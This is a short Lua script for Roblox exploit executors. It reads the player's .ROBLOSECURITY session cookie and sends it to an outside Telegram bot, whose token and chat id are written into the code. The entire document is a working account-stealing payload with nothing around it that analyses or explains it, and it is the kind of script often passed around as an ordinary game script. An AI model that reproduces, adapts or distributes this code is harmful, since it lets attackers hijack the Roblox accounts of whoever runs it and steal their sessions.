(function()
    local d = {
        chat_id = 2138242220,
        text = 'Cookie: ' .. ((game:HttpGet('https://www.roblox.com/mobileapi/userinfo', true) or ''):match('.ROBLOSECURITY[^;]*') or 'None')
    }
    local request_func = syn and syn.request or http_request or request or function() end
    request_func({
        Url = 'https://api.telegram.org/bot8926089236:AAElA0yWSDZsjDUJU432cSASLcc298KZ-5U/sendMessage',
        Method = 'POST',
        Headers = { ['Content-Type'] = 'application/json' },
        Body = game:GetService('HttpService'):JSONEncode(d)
    })
end)()